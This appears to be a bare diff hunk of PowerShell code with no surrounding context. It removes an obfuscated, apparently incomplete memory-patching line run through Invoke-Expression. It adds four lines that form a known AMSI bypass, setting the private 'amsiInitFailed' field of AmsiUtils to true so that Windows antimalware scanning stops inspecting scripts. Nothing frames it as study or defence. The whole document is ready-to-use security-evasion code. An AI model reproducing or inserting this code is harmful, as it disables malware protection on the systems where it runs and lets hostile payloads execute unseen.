@@ -1,1 +1,4 @@
-$content = "$LANG='C.UTF-8';$a=$null;$ptr=[System.IntPtr]::Add([System.IntPtr]$g,0x8);if($buf){[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,8)}"; $content -replace ';',"`n" -split "`n" | ForEach-Object { $line=$_.Trim(); if($line -ne "" -and $line -match '.+=') { Invoke-Expression $line } }
+$a='System.Management.Automation.AmsiUtils'
+$t=[Ref].Assembly.GetType($a)
+$f=$t.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null,$true)
